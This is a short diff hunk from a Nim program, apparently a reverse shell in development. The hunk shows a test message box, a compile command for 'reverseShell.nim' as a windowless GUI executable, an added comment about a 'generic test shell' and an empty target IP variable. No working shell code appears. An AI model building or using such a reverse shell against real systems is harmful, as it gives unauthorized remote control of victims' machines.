@@ -4,6 +4,7 @@ import osproc
 MessageBox(0, "Hello, world!", "Nim is Powerful", 0)
 
 #nim c -d:mingw --app:gui reverseShell.nim && mv nimshell.exe
+#Devloping generic test shell using nim
 
 var 
     targetIP = ""
